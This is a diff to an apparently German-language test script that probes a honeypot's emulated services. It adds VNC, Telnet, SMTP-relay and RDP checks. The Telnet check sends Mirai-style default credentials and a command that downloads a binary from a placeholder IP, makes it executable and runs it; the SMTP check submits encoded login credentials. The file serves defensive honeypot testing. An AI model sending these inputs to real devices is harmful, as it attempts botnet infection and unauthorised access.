@@ -24,7 +24,8 @@ from datetime import datetime, timezone
 
 # Container-Port -> Standard-Host-Port aus .env.example
 DEFAULT_HOST_PORTS = {21: 10021, 80: 10080, 443: 10443, 2375: 12375, 2222: 12222,
-                      3306: 13306, 6379: 16379, 5900: 15900, 8080: 18080}
+                      3306: 13306, 6379: 16379, 5900: 15900, 8080: 18080,
+                      25: 10025, 2323: 12323, 3389: 13389}
 
 
 def conn(host, port, timeout=5):
@@ -116,10 +117,60 @@ def t_ssh_tarpit(host, port):
     s.close()
 
 
-def t_raw(host, port):
-    s = conn(host, port, timeout=3)
-    s.sendall(b"RFB 003.008\n\x01\x02\x03")
-    print(f"  Raw: {recv_some(s, 20)!r}")
+def t_vnc(host, port):
+    s = conn(host, port, timeout=4)
+    print(f"  VNC Banner: {recv_some(s, 12)!r}")
+    s.sendall(b"RFB 003.008\n")
+    recv_some(s, 2)
+    s.sendall(b"\x02")
+    recv_some(s, 16)
+    s.sendall(b"\x5a" * 16)
+    print(f"  VNC Ergebnis: {recv_some(s, 40)!r}")
+    s.close()
+
+
+def t_telnet(host, port):
+    s = conn(host, port)
+    r = recv_some(s)
+    for line in (b"root", b"xc3511", b"enable", b"/bin/busybox MIRAI",
+                 b"cd /tmp; wget http://203.0.113.9/bins/mips -O dvr; chmod 777 dvr; ./dvr"):
+        s.sendall(line + b"\r\n")
+        time.sleep(0.3)
+        r = recv_some(s)
+    print(f"  Telnet: {r[-40:]!r}")
+    s.close()
+
+
+def t_smtp(host, port):
+    s = conn(host, port)
+    f = s.makefile("rb")
+    print(f"  SMTP Banner: {f.readline()!r}")
+    s.sendall(b"EHLO scanner.example\r\n")
+    while not f.readline().startswith(b"250 "):
+        pass
+    s.sendall(b"AUTH LOGIN\r\n")
+    f.readline()
+    s.sendall(b"aW5mb0BleGFtcGxlLmNvbQ==\r\n")
+    f.readline()
+    s.sendall(b"U29tbWVyMjAyNCE=\r\n")
+    print(f"  SMTP AUTH: {f.readline()!r}")
+    s.sendall(b"MAIL FROM:<a@example.com>\r\n")
+    f.readline()
+    s.sendall(b"RCPT TO:<b@example.org>\r\n")
+    f.readline()
+    s.sendall(b"DATA\r\n")
+    f.readline()
+    s.sendall(b"Subject: Test\r\n\r\nOpen relay test\r\n.\r\n")
+    print(f"  SMTP DATA: {f.readline()!r}")
+    s.close()
+
+
+def t_rdp(host, port):
+    x224 = b"\xe0\x00\x00\x00\x00\x00" + b"Cookie: mstshash=Administr\r\n" + b"\x01\x00\x08\x00\x00\x00\x00\x00"
+    x224 = bytes([len(x224)]) + x224
+    s = conn(host, port, timeout=4)
+    s.sendall(b"\x03\x00" + struct.pack(">H", len(x224) + 4) + x224)
+    print(f"  RDP Antwort: {recv_some(s, 19)!r}")
     s.close()
 
 
@@ -170,7 +221,9 @@ def main():
     tests = [("HTTP", lambda: t_http(a.host, p(80))), ("HTTPS", lambda: t_http(a.host, p(443), tls=True)),
              ("Docker-API", lambda: t_docker(a.host, p(2375))), ("FTP", lambda: t_ftp(a.host, p(21))),
              ("Redis", lambda: t_redis(a.host, p(6379))), ("MySQL", lambda: t_mysql(a.host, p(3306))),
-             ("SSH-Tarpit", lambda: t_ssh_tarpit(a.host, p(2222))), ("Raw", lambda: t_raw(a.host, p(5900))),
+             ("SSH-Tarpit", lambda: t_ssh_tarpit(a.host, p(2222))), ("VNC", lambda: t_vnc(a.host, p(5900))),
+             ("Telnet", lambda: t_telnet(a.host, p(2323))), ("SMTP", lambda: t_smtp(a.host, p(25))),
+             ("RDP", lambda: t_rdp(a.host, p(3389))),
              ("HTTP-Alt (hybrid)", lambda: t_http(a.host, p(8080)))]
     if not a.no_attacks:
         for name, fn in tests:
